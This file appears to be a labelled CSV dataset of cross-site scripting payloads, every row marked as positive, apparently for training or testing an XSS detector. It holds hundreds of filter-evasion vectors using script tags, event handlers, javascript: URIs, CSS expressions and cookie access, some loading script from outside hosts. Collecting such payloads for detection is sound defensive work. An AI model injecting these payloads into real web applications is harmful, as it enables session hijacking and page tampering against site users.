payload,xss
confirm(2)>/,1
open()>,1
location=?javascript:alert(1)>click,1
<svg><script>alert(/1/)</script>,1
</script><script>alert(1)</script>,1
5rt(0);'>rhainfosec,1
">""<img src=&{document.cookie=true;};>",1
">""<img src=""mocha:document.cookie=true;"">",1
">""<img src=""livescript:document.cookie=true;"">",1
"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">",1
prompt(1);>,1
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>",1
<iframe src=http://vulnerability-lab.com/index.html <,1
"<table background=""javascript:alert('crosssitescripting')"">",1
"<table><td background=""javascript:alert('crosssitescripting')"">",1
"<bgsound src=""javascript:alert('crosssitescripting');"">",1
"<br size=""&{alert('crosssitescripting')}"">",1
"<a href=""http://server.com/"">crosssitescripting</a>",1
"<a href=""http://www.google.com"">crosssitescripting</a>",1
"<a href=""http://1113982867/"">crosssitescripting</a>",1
"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>",1
"<base href=""javascript:alert('crosssitescripting');//"">",1
""";alert('crosssitescripting');//",1
"<input type=""image"" src=""javascript:alert('crosssitescripting');"">",1
"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">",1
scriptalert(crosssitescripting)/script,1
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">",1
"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>",1
"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",1
"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>",1
</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>,1
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>",1
"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",1
"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",1
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",1
"<?import namespace=""t"" implementation=""#default#time2"">",1
"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">",1
</body></html>,1
"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>",1
"<? echo('<scr)';echo('ipt>alert(""crosssitescripting"")</script>'); ?>",1
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",1
<iframe src=http://test.de>,1
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>",1
><img id=xss src=x onerror=alert(xss);>,1
";!--""<xss>=&{()}""",1
"<img id=xss src=""javascript:alert('xss');"">",1
<img id=xss src=javascript:alert('xss')>,1
"<img id=xss src=javascript:alert(""xss"")>",1
"<img id=xss src=`javascript:alert(""'xss'"")`>",1
"<img id=xss src=""jav ascript:alert('xss');"">",1
"<img id=xss src=javascript:alert(""xss"")>"";' >",1
"<img id=xss src="" javascript:alert('xss');"">",1
"<<script>alert(""xss"");//<</script>",1
""";alert('xss');//",1
<img id=xss src='javascript:alert('xss'),1
<script>alert(/xss/.source)</script>,1
"<body background=""javascript:alert('xss')"">",1
"</title><script>alert(""xss"");</script>",1
"<input type=""image"" id=xss src=""javascript:alert('xss');"">",1
<script>alert('xssya')</script>,1
"<script>alert(""xssya"")</script>",1
1<script>prompt(999691)</script>,1
//1<script>prompt(919397)</script>,1
"""<script>alert('xssya')</script>",1
"'""</script><script>alert('xssya')</script>",1
1<script >prompt(962477)</script>,1
<script>alert(1);</script>,1
"""><script>alert('xssya')</script>",1
"'';!--""<xss>=&{()}",1
alert(1)>,1
""";alert(1)//",1
<script>alert('xssya');</script>,1
"'""--></style></script><script>alert('xss')</script>",1
<scr<script>ipt>alert(1)</scr<script>ipt>,1
javascript:alert(1)//,1
<script>confirm(0);</script>,1
"""x:alert"" onerror=""eval(src+'(0)')"">",1
"data:text/html,<script>alert(0)</script>",1
<body/onhashchange=alert(1)><a+href=#>clickit,1
<img+src=x+onerror=prompt(1);>,1
<video+src=x+onerror=prompt(1);>,1
"""javascript:alert(2)"">",1
""";alert('xss)//",1
"<img """"""><script>alert(""xss"")</script>"">",1
x onfocus=alert(1)>,1
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",1
"""javascript:alert(1)""><input type=submit>",1
"data:text/html, type=image>",1
<isindex action=j a vas c r ipt:alert(1) type=image>,1
confirm(2)>,1
"""http://www.google.com./"">xss</a>",1
"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>",1
write(1) autofocus>,1
write(1) autofocus><input autofocus>,1
javascript:alert(1)//></video>,1
alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,1
test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>,1
"""alert(1)"">",1
"""alert(1)""><source></source></video>",1
"""javascript:alert(1)"">x</button>",1
alert(1)><input autofocus>,1
"""javascript:alert(1)"">clickme</math>",1
"""import"" href=""test.svg"" />",1
"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />",1
"""x""><img onerror=""alert(1)""></picture>",1
"""x"" onerror=""alert(1)""></picture>",1
""",,,,,x"" onerror=""alert(1)"">",1
"""javascript:alert(1)""></table>",1
"""--><img src=x onerror=alert(1)//"">",1
"""</comment><img src=x onerror=alert(1)//"">",1
"""</style><img src=x onerror=alert(1)//"">",1
list-style:url() onerror=alert(1)></li>,1
"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>",1
"""javascript://""/></head><body><a href=""/. /,alert(1)//",1
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></object>",1
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>",1
<b <script>alert(1)//</script>0</script></b>,1
"""div1""><input value=""``onmouseover=alert(1)""></div> <div id=""div2""></div>",1
"document.getelementbyid(""div1"").innerhtml;</script>",1
width:1px;filter:glow onfilterchange=alert(1)>x</div>,1
mhtml:http://html5sec.org/test.html!xss.html></iframe>,1
"""x` `<script>alert(1)</script>""` `>",1
"alt=alert(1)//"">",1
alert(1)></title><title title=></title>,1
xx:xx onerror=alert(1)//--!>,1
"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>",1
"<style>@import ""data:,*{x:expression(write(1))}"";</style>",1
x:expression8write(1)9>,1
"$,_=1}}).$=alert</script>",1
"<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>",1
"function,[{}][0].constructor._('alert(1)')()</script>",1
"""#"">{alert(1)}</script>;1",1
<b><script<b></b><alert(1)</script </b></b>,1
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",1
<script>document.cookie=true;</script>,1
"<img src=""jav ascript:document.cookie=true;"">",1
"<img src=""javascript:document.cookie=true;"">",1
"<img src="" javascript:document.cookie=true;"">",1
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",1
<script>document.cookie=true;//<</script>,1
<script <b>document.cookie=true;</script>,1
"<iframe src=""javascript:document.cookie=true;>",1
<script>a=/crosssitescripting/ document.cookie=true;</script>,1
</title><script>document.cookie=true;</script>,1
"<input type=""image"" src=""javascript:document.cookie=true;"">",1
"<body background=""javascript:document.cookie=true;"">",1
<body onload=document.cookie=true;>,1
"<img dynsrc=""javascript:document.cookie=true;"">",1
"<img lowsrc=""javascript:document.cookie=true;"">",1
"<bgsound src=""javascript:document.cookie=true;"">",1
"<br size=""&{document.cookie=true}"">",1
"<layer src=""javascript:document.cookie=true;""></layer>",1
"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",1
scriptdocument.cookie=true;/script,1
"<iframe src=""javascript:document.cookie=true;""></iframe>",1
"<frameset><frame src=""javascript:document.cookie=true;""></frameset>",1
"<table background=""javascript:document.cookie=true;"">",1
"<table><td background=""javascript:document.cookie=true;"">",1
"<div style=""background-image: url(javascript:document.cookie=true;)"">",1
"<div style=""width: expression(document.cookie=true);"">",1
<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,1
"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",1
"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",1
"exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",1
"<style type=""text/javascript"">document.cookie=true;</style>",1
<body onload=alert('xss')>,1
"<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",1
"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",1
"<base href=""javascript:document.cookie=true;//"">",1
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>,1
"<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",1
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",1
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",1
<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>,1
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",1
"<a href=""javascript#document.cookie=true;"">",1
"<div onmouseover=""document.cookie=true;"">",1
"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",1
&<script>document.cookie=true;</script>,1
&{document.cookie=true;};,1
<img src=&{document.cookie=true;};>,1
"<img src=""mocha:document.cookie=true;"">",1
"<img src=""livescript:document.cookie=true;"">",1
"<a href=""about:<script>document.cookie=true;</script>"">",1
"<body onload=""document.cookie=true;"">",1
"<div style=""background-image: url(javascript:document.cookie=true;);"">",1
"<div style=""behaviour: url([link to code]);"">",1
"<div style=""binding: url([link to code]);"">",1
"<div style=""width: expression(document.cookie=true;);"">",1
"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",1
<style><!--</style><script>document.cookie=true;//--></script>,1
<<script>document.cookie=true;</script>,1
<script>document.cookie=true;//--></script>,1
<!-- -- --><script>document.cookie=true;</script><!-- -- -->,1
"<img src=""blah""onmouseover=""document.cookie=true;"">",1
"<img src=""blah>"" onmouseover=""document.cookie=true;"">",1
"<xml src=""javascript:document.cookie=true;"">",1
"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",1
"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",1
">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",1
">""<script>document.cookie=true;</script>",1
">""<img src=""jav ascript:document.cookie=true;"">",1
">""<img src=""javascript:document.cookie=true;"">",1
">""<img src="" javascript:document.cookie=true;"">",1
">""<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",1
">""<script>document.cookie=true;//<</script>",1
">""<script <b>document.cookie=true;</script>",1
">""<iframe src=""javascript:document.cookie=true;>",1
">""<script>a=/crosssitescripting/ document.cookie=true;</script>",1
">""</title><script>document.cookie=true;</script>",1
">""<input type=""image"" src=""javascript:document.cookie=true;"">",1
">""<body background=""javascript:document.cookie=true;"">",1
">""<body onload=document.cookie=true;>",1
">""<img dynsrc=""javascript:document.cookie=true;"">",1
">""<img lowsrc=""javascript:document.cookie=true;"">",1
">""<bgsound src=""javascript:document.cookie=true;"">",1
">""<br size=""&{document.cookie=true}"">",1
">""<layer src=""javascript:document.cookie=true;""></layer>",1
">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",1
">""scriptdocument.cookie=true;/script",1
">""<iframe src=""javascript:document.cookie=true;""></iframe>",1
">""<frameset><frame src=""javascript:document.cookie=true;""></frameset>",1
">""<table background=""javascript:document.cookie=true;"">",1
">""<table><td background=""javascript:document.cookie=true;"">",1
">""<div style=""background-image: url(javascript:document.cookie=true;)"">",1
">""<div style=""width: expression(document.cookie=true);"">",1
">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>",1
">""<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">",1
">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",1
">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",1
">""<style type=""text/javascript"">document.cookie=true;</style>",1
">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",1
">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>",1
">""<base href=""javascript:document.cookie=true;//"">",1
">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>",1
">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",1
">""<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",1
">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",1
">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",1
">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",1
">""<a href=""javascript#document.cookie=true;"">",1
">""<div onmouseover=""document.cookie=true;"">",1
">""<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",1
">""&<script>document.cookie=true;</script>",1
">""&{document.cookie=true;};",1
">""<a href=""about:<script>document.cookie=true;</script>"">",1
">""<body onload=""document.cookie=true;"">",1
">""<div style=""background-image: url(javascript:document.cookie=true;);"">",1
">""<div style=""behaviour: url([link to code]);"">",1
">""<div style=""binding: url([link to code]);"">",1
">""<div style=""width: expression(document.cookie=true;);"">",1
">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",1
">""<style><!--</style><script>document.cookie=true;//--></script>",1
">""<<script>document.cookie=true;</script>",1
">""<script>document.cookie=true;//--></script>",1
">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->",1
">""<img src=""blah""onmouseover=""document.cookie=true;"">",1
">""<img src=""blah>"" onmouseover=""document.cookie=true;"">",1
">""<xml src=""javascript:document.cookie=true;"">",1
">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",1
">""<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>",1
"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",1
-1<script>document.cookie=true;</script>,1
"-1<img src=""jav ascript:document.cookie=true;"">",1
"-1<img src=""javascript:document.cookie=true;"">",1
"-1<img src="" javascript:document.cookie=true;"">",1
"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",1
-1<script>document.cookie=true;//<</script>,1
-1<script <b>document.cookie=true;</script>,1
"-1<iframe src=""javascript:document.cookie=true;>",1
-1<script>a=/crosssitescripting/ document.cookie=true;</script>,1
-1</title><script>document.cookie=true;</script>,1
"-1<input type=""image"" src=""javascript:document.cookie=true;"">",1
"-1<body background=""javascript:document.cookie=true;"">",1
-1<body onload=document.cookie=true;>,1
"-1<img dynsrc=""javascript:document.cookie=true;"">",1
"-1<img lowsrc=""javascript:document.cookie=true;"">",1
"-1<bgsound src=""javascript:document.cookie=true;"">",1
"-1<br size=""&{document.cookie=true}"">",1
"-1<layer src=""javascript:document.cookie=true;""></layer>",1
"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",1
-1scriptdocument.cookie=true;/script,1
"-1<iframe src=""javascript:document.cookie=true;""></iframe>",1
"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>",1
"-1<table background=""javascript:document.cookie=true;"">",1
"-1<table><td background=""javascript:document.cookie=true;"">",1
"-1<div style=""background-image: url(javascript:document.cookie=true;)"">",1
